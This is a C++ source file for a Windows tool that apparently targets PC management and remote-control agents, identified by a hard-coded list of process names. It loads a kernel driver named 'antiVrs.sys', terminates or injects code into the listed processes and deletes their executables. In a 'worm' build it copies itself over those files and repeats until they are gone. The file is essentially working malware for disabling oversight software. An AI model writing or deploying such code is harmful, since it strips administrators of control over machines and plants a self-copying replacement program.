#include "main.h"
using namespace std;
#define INITIALIZE_IOCTL_CODE 0x9876C004
#define TERMINSTE_PROCESS_IOCTL_CODE 0x9876C094
#define LOOP_COUNT 70

typedef long (NTAPI* pNtProcess)(HANDLE proccessHandle);
pNtProcess NtSuspendProcess;
pNtProcess NtResumeProcess;

const wchar_t* latest[] = { L"lqndauccd.exe", L"MaestroWebSvr.exe", L"qukapttp.exe", L"MaestroWebAgent.exe", L"nfowjxyfd.exe", L"SoluLock.exe" };
const wchar_t* remote[] = { L"TDepend64.exe", L"TDepend.exe" };
const wchar_t* unknown[] = { L"rwtyijsa.exe", L"nhfneczzm.exe", L"rzzykzbis.exe" };
const wchar_t* legacy[] = { L"SoluSpSvr.exe", L"MaestroNAgent.exe", L"MaestroNSvr.exe" };

bool LoadDriver(const char* serviceName, char* driverPath) {
    SC_HANDLE hSCM, hService;

    // Open a handle to the SCM database
    hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCM == NULL) {
        return 0;
    }

    // Check if the service already exists
    hService = OpenServiceA(hSCM, serviceName, SERVICE_ALL_ACCESS);
    if (hService != NULL)
    {
        cout << "Service already exists.\n";

        // Start the service if it's not running
        SERVICE_STATUS serviceStatus;
        if (!QueryServiceStatus(hService, &serviceStatus))
        {
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return 0;
        }

        if (serviceStatus.dwCurrentState == SERVICE_STOPPED)
        {
            if (!StartServiceA(hService, 0, nullptr))
            {
                cout << "Could not found.\n";
                CloseServiceHandle(hService);
                CloseServiceHandle(hSCM);
                return 0;
            }

            cout << "Starting service...\n";
        }

        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return 1;
    }

    // Create the service
    hService = CreateServiceA(
        hSCM,
        serviceName,
        serviceName,
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        driverPath,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL
    );

    if (hService == NULL) {
        CloseServiceHandle(hSCM);
        return (1);
    }

    cout << "Service created successfully.\n";

    // Start the service
    if (!StartServiceA(hService, 0, nullptr))
    {
        cout << hex << GetLastError() << '\n';
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return 0;
    }

    cout << "Starting service...\n";

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    return 1;
}

bool RemoveDriver(const char* serviceName, char* driverPath) {
    SC_HANDLE hSCM, hService;

    // Open a handle to the SCM database
    hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCM == NULL) {
        return 0;
    }

    // Check if the service already exists
    hService = OpenServiceA(hSCM, serviceName, SERVICE_ALL_ACCESS);
    if (hService == NULL)
    {
        cout << "Service already deleted.\n";
        return 0;
    }
    DeleteService(hService);

    cout << "Service deleted.\n";

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    return 1;
}

static bool LoadNT() {
    auto ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return false;
    NtSuspendProcess = (pNtProcess)GetProcAddress(ntdll, "NtSuspendProcess");
    NtResumeProcess = (pNtProcess)GetProcAddress(ntdll, "NtResumeProcess");
    return !!NtSuspendProcess;
}

static int TerminateProc(PROCESSENTRY32& procEntry, int buildType) {
    if (buildType == BUILD_TYPE_FORCE) {
        if (KillProcessorByUserMode(procEntry.th32ProcessID)) return 1;
    }
    DWORD output[2] = { 0 };
    DWORD size = sizeof(output);
    DWORD byteReturned = 0;

	DWORD dwExitCode = 0;
	auto handle = OpenProcess(PROCESS_ALL_ACCESS, true, procEntry.th32ProcessID);
    if (GetExitCodeProcess(handle, &dwExitCode)) {
        if (TerminateProcess(handle, dwExitCode)) {
            CloseHandle(handle);
            return 1;
        }
    }
    if (buildType == BUILD_TYPE_FORCE) {
        if (InjectCode(handle)) {
            //cout << "\n* Injection Success\n";
            return 1;
        }
    }

    /*
    if (NtSuspendProcess) {
        auto result = NtSuspendProcess(handle);
        cout << (unsigned long)result;
        if (result >= 0) {
            CloseHandle(handle);
            return 2;
        }
    }
    */

	CloseHandle(handle);
	return 0;
}

static bool ResumeProc(PROCESSENTRY32& procEntry) {
    auto handle = OpenProcess(PROCESS_ALL_ACCESS, true, procEntry.th32ProcessID);

    if (NtSuspendProcess) {
        auto result = NtResumeProcess(handle);
        cout << result;
        if (result >= 0) {
            CloseHandle(handle);
            return true;
        }
    }

    CloseHandle(handle);
    return false;
}

static PROCESSENTRY32 Find(const wchar_t* name) {
    auto handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    PROCESSENTRY32 result = { 0 };
    PROCESSENTRY32 procEntry = { 0 };
    result.th32ProcessID = 0;
    procEntry.dwSize = sizeof(PROCESSENTRY32);
    Process32First(handle, &procEntry);
    do {
        if (wcscmp(procEntry.szExeFile, name)) continue;
        result = procEntry;
        break;
    } while (Process32Next(handle, &procEntry));
    CloseHandle(handle);
    return result;
}

static void LogServiceList() {
    SC_HANDLE sc = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS | SC_MANAGER_ENUMERATE_SERVICE);
    if (!sc) return;
    DWORD bytesNeeded = 0;
    DWORD numServices = 0;
    DWORD resumeHandle = 0;
    
    
    if(EnumServicesStatus(sc, SERVICE_WIN32, SERVICE_STATE_ALL, NULL, 0, &bytesNeeded, &numServices, &resumeHandle) && GetLastError() != ERROR_MORE_DATA) {
        cout << hex << GetLastError() << "A\n"; return;
    }

    vector<BYTE> enumBuffer(bytesNeeded);
    LPENUM_SERVICE_STATUS pEnum = reinterpret_cast<LPENUM_SERVICE_STATUS>(enumBuffer.data());
    if (!EnumServicesStatus(sc, SERVICE_WIN32, SERVICE_STATE_ALL, pEnum, bytesNeeded, &bytesNeeded, &numServices, &resumeHandle)) {
        cout << "B=n"; return;
    }


    for (DWORD idx = 0; idx < numServices; ++idx) {
        wcout << pEnum[idx].lpServiceName << " (" << pEnum[idx].lpDisplayName << ")\n";
    }
    CloseServiceHandle(sc);
}

static void LogProcessList() {
    LogServiceList();
    return;
    auto handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    PROCESSENTRY32 procEntry = { 0 };
    procEntry.dwSize = sizeof(PROCESSENTRY32);
    Process32First(handle, &procEntry);
    do {
        auto handle = OpenProcess(PROCESS_ALL_ACCESS, false, procEntry.th32ProcessID);
        wchar_t filePath[MAX_PATH] = { 0 };
        DWORD len = MAX_PATH;
        QueryFullProcessImageNameW(handle, NULL, filePath, &len);
        CloseHandle(handle);
        cout << "PATH: "; wcout << filePath; cout << '\n';
    } while (Process32Next(handle, &procEntry));
    CloseHandle(handle);
}

static bool IsMainProcess() {
    wchar_t src[MAX_PATH];
    DWORD len = GetModuleFileNameW(NULL, src, MAX_PATH);
    if(!len) return false;
    wchar_t* filename = wcsrchr(src, L'\\') + 1;
    for (int i = sizeof(latest) / sizeof(const wchar_t*) - 1; i >= 0; i--) {
        if (!wcscmp(filename, latest[i])) return false;
    }
    for (int i = sizeof(remote) / sizeof(const wchar_t*) - 1; i >= 0; i--) {
        if (!wcscmp(filename, remote[i])) return false;
    }
    for (int i = sizeof(unknown) / sizeof(const wchar_t*) - 1; i >= 0; i--) {
        if (!wcscmp(filename, unknown[i])) return false;
    }
    for (int i = sizeof(legacy) / sizeof(const wchar_t*) - 1; i >= 0; i--) {
        if (!wcscmp(filename, legacy[i])) return false;
    }
    return true;
}

static bool IsCurrentProcess(const wchar_t* target) {
    wchar_t src[MAX_PATH];
    DWORD len = GetModuleFileNameW(NULL, src, MAX_PATH);
    if (!len) return false;
    return !wcscmp(src, target);
}

static void CopyTo(const wchar_t* dest) {
    wchar_t src[MAX_PATH];
    if (GetModuleFileNameW(NULL, src, MAX_PATH))
        CopyFileW(src, dest, false);
}

static int LoopKiller(const char* type, int count, const wchar_t* list[], int length, int buildType) {
    bool isMainProcess = IsMainProcess();
    int remain = length;
    cout << type << " Process Detecting...\n";
    for (int i = 0; i < length; i++) {
        auto p = Find(list[i]);
        if (p.th32ProcessID == 0) continue;
        cout << "Detected ["; wcout << p.szExeFile; cout << "](PID:" << p.th32ProcessID << ")\n";
        auto handle = OpenProcess(PROCESS_ALL_ACCESS, false, p.th32ProcessID);
        wchar_t filePath[MAX_PATH] = { 0 };
        DWORD len = MAX_PATH;
        QueryFullProcessImageNameW(handle, NULL, filePath, &len);
        CloseHandle(handle);
        cout << "PATH: "; wcout << filePath; cout << '\n';
        if (IsCurrentProcess(filePath)) {
            cout << "Is Current Proccess, Skipped.\n";
            continue;
        }
        if (buildType == BUILD_TYPE_RESUME) {
            cout << "Try To Resume...\n";
            if (ResumeProc(p)) cout << green << "Success!";
            else cout << red << "Failed.";
            cout << white << '\n';
            continue;
        }
        bool killed = false;
        bool deleted = false;

        for (int j = 0; j < count; j++) {
            p = Find(list[i]);
            if (!p.th32ProcessID) {
                if (DeleteFileW(filePath)) {
                    deleted = true;
                    if (buildType == BUILD_TYPE_WORM && isMainProcess) CopyTo(filePath);
                }
                killed = 1;
                break;
                continue;
            }

            int result = TerminateProc(p, buildType);
            if (!result) continue;
            if (result == 2) {
                cout << magenta << "Suspended.." << white << '\n';
                break;
            }
            if (DeleteFileW(filePath)) {
                deleted = true;
                if (buildType == BUILD_TYPE_WORM && isMainProcess) CopyTo(filePath);
                //killed = true;
                //break;
            }
        }

        if (!killed) {
            p = Find(list[i]);
            if (!p.th32ProcessID) killed = true;
        }
        cout << "Try To Kill...\n";
        if (killed) cout << green << "Success!";
        else cout << red << "Failed...";
        cout << white << '\n';

        cout << "Try To Delete Execution File...\n";
        if (deleted) cout << green << "Success!";
        else cout << red << "Failed...";
        cout << white << '\n';
        remain -= deleted;
    }
    return remain;
}

void run(int buildType) {
    cin.tie(0), cout.tie(0)->sync_with_stdio(0);
    wcin.tie(0), wcout.tie(0)->sync_with_stdio(0);
    if (Privilege()) cout << "Success Privileges.\n";
    // https://qwoowp.tistory.com/175

    char driverPath[MAX_PATH];
    if (buildType == BUILD_TYPE_FORCE) {
        WIN32_FIND_DATAA file;
        if (FindFirstFileA("antiVrs.sys", &file) != INVALID_HANDLE_VALUE) {
            if (GetFullPathNameA(file.cFileName, MAX_PATH, driverPath, NULL) != 0) {
                cout << "Driver found.\n";
            }
            else
                cout << "Find Driver Failed\n";
        }
        else
            cout << "Find Driver Failed\n";

        if (!LoadDriver("antiVrs", driverPath))
            cout << "Faild to load driver ,try to run the program as administrator!!\n";
    }

    if (LoadNT())
        cout << "NT Loaded\n";
    else
        cout << "NT Load Failed..\n";

    bool isMainProcess = IsMainProcess();
    int remain = 0;
    if (buildType == BUILD_TYPE_LOG_PROC) {
        LogProcessList();
        goto end;
    }
    restart:

    remain += LoopKiller("Latest CKIR", LOOP_COUNT, latest, sizeof(latest) / sizeof(const wchar_t*), buildType);
    remain += LoopKiller("Remote Control", LOOP_COUNT, remote, sizeof(remote) / sizeof(const wchar_t*), buildType);
    remain += LoopKiller("Unknown", LOOP_COUNT, unknown, sizeof(unknown) / sizeof(const wchar_t*), buildType);
    remain += LoopKiller("Legacy", LOOP_COUNT, legacy, sizeof(legacy) / sizeof(const wchar_t*), buildType);

    cout << "\nTotal Remain Processors: " << remain << '\n';

    if (buildType == BUILD_TYPE_WORM && remain > 1 && isMainProcess) {
        cout << yellow << "Restart!" << white << '\n';
        goto restart;
    }

    end:
    if (buildType == BUILD_TYPE_FORCE) {
        if(RemoveDriver("antiVrs", driverPath)) {
            cout << "Service delete success.\n";
        }else
            cout << "Service delete failed.\n";
    }
    if (isMainProcess) {
        cout << "\n\nPress Enter to exit...";
        system("pause");
        getchar();
    }
}